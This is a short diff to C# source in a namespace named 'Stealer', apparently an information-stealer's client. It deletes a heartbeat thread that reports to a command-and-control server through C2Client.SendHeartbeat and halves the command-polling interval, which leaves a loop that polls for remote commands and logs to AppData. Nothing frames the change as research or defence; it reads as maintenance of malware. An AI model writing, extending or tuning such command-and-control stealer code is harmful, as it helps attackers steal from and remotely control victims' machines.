@@ -9,8 +9,7 @@ namespace Stealer
 {
     class Program
     {
-        private static readonly int HeartbeatInterval = 25000;
-        private static readonly int CommandPollInterval = 10000;
+        private static readonly int CommandPollInterval = 5000;
         private static string _clientId;
         private static readonly string CrashLog = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
@@ -38,9 +37,6 @@ namespace Stealer
 
                 File.AppendAllText(CrashLog, DateTime.Now + " STARTING LOOPS\r\n");
 
-                var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
-                heartbeatThread.Start();
-
                 CommandLoop();
             }
             catch (Exception ex)
@@ -49,24 +45,6 @@ namespace Stealer
             }
 
             while (true) { Thread.Sleep(60000); }
-        }
-
-        private static void HeartbeatLoop()
-        {
-            File.AppendAllText(CrashLog, DateTime.Now + " HB THREAD ALIVE\r\n");
-            while (true)
-            {
-                try
-                {
-                    C2Client.SendHeartbeat(_clientId);
-                    File.AppendAllText(CrashLog, DateTime.Now + " HB OK\r\n");
-                }
-                catch (Exception ex)
-                {
-                    File.AppendAllText(CrashLog, DateTime.Now + " HB ERR: " + ex.GetType().Name + ": " + ex.Message + "\r\n");
-                }
-                Thread.Sleep(HeartbeatInterval);
-            }
         }
 
         private static void CommandLoop()
